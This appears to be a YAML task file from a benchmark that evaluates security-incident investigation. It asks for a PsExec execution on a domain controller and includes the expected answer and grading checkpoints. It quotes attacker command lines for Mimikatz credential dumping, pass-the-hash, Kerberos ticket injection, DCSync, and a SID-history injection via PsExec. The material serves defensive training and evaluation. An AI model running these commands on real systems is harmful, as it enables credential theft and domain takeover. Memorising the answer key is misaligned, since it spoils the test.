tasks:
- task_id: incident_39_latest_cleaned_test_set_task_67
  title: incident_39_latest_cleaned_test_set_task_67
  description: 'Shortly after the Mimikatz activity, a related alert reported that PsExec was used to launch a command on a remote device. What was the process ID and the full command line of that PsExec execution, and which remote host was targeted?'
  inherit_shared: true
  initial_context:
    incident_context: 'During an investigation, the Mimikatz credential theft tool was detected on a device in the vnevado.alpineskihouse.co domain. Multiple executions were observed on 2024-06-27, including `"mimikatz.exe" privilege::debug sekurlsa::logonpasswords exit` (PID 5196), pass-the-hash attempts such as `sekurlsa::pth /user:kyleg /ntlm:96def1a633fc6790124d5f8fe31cc72b ...` (PID 4112), a Kerberos ticket injection `kerberos::ptt c:\m365dattack\admin-tickets` (PID 5176), and a DCSync attempt `lsadump::dcsync /domain:vnevado.alpineskihouse.co /user:xfbzkp` (PID 4748).'
    question: 'Shortly after the Mimikatz activity, a related alert reported that PsExec was used to launch a command on a remote device. What was the process ID and the full command line of that PsExec execution, and which remote host was targeted?'
    # Main task submission evaluation - uses LLM-as-a-judge by default
    # To use static matching instead, change strategy to "static" and set:
    #   criteria:
    #     expected_answers:
    #       - 'Process ID 5612, created 2024-06-27T14:33:48.8916656Z, command line: `"psexec.exe" \\vnevado-dc -accepteula cmd /c "powershell.exe -command "net.exe stop ntds /y; add-addbsidhistory -samaccountname bdadmin -sidhistory \"s-1-5-32-544\" -databasepath (get-itemproperty -path registry::hklm\system\currentcontrolset\services\ntds\parameters).\"dsa database file\" -force; net.exe start ntds""` — the remote device targeted was the domain controller `vnevado-dc`.'
  scoring:
    llm_judge:
      model: "{judge_llm}"
      steps_per_message: 50
      judge_system_template: judge/checkpoint_judge_system.md
      judge_user_template: judge/checkpoint_judge_user.md
      submission:
        target: submission
        judge_system_template: judge/submission_judge_system.md
        judge_user_template: judge/submission_judge_user.md
        description: 'Process ID 5612, created 2024-06-27T14:33:48.8916656Z, command line: `"psexec.exe" \\vnevado-dc -accepteula cmd /c "powershell.exe -command "net.exe stop ntds /y; add-addbsidhistory -samaccountname bdadmin -sidhistory \"s-1-5-32-544\" -databasepath (get-itemproperty -path registry::hklm\system\currentcontrolset\services\ntds\parameters).\"dsa database file\" -force; net.exe start ntds""` — the remote device targeted was the domain controller `vnevado-dc`.'
        max_score: 1.0
      checkpoint_1:
        target: trajectory
        max_score: 0.5
        weight: 1.0
        title: Checkpoint 1
        description: 'The Mimikatz credential theft tool was detected running through the process `powershell.exe` (ExtractedFileName: `powershell.exe`), indicating an attempt to harvest credentials from the device.'
      checkpoint_2:
        target: trajectory
        max_score: 0.5
        weight: 1.0
        title: Checkpoint 2
        description: 'Using the stolen credentials, the attacker leveraged PsExec to launch a command on a remote device: Process ID `5612` at `2024-06-27t14:33:48.8916656z` with command line `"psexec.exe" \\vnevado-dc -accepteula cmd /c "powershell.exe -command "net.exe stop ntds /y; add-addbsidhistory -samaccountname bdadmin -sidhistory \"s-1-5-32-544\" -databasepath (get-itemproperty -path registry::hklm\system\currentcontrolset\services\ntds\parameters).\"dsa database file\" -force; net.exe start ntds""`, stopping the NTDS service and injecting SID history for persistence and lateral movement.'
  scoring_aggregation:
    max:
      scores:
      - submission
      - - checkpoint_1
        - checkpoint_2
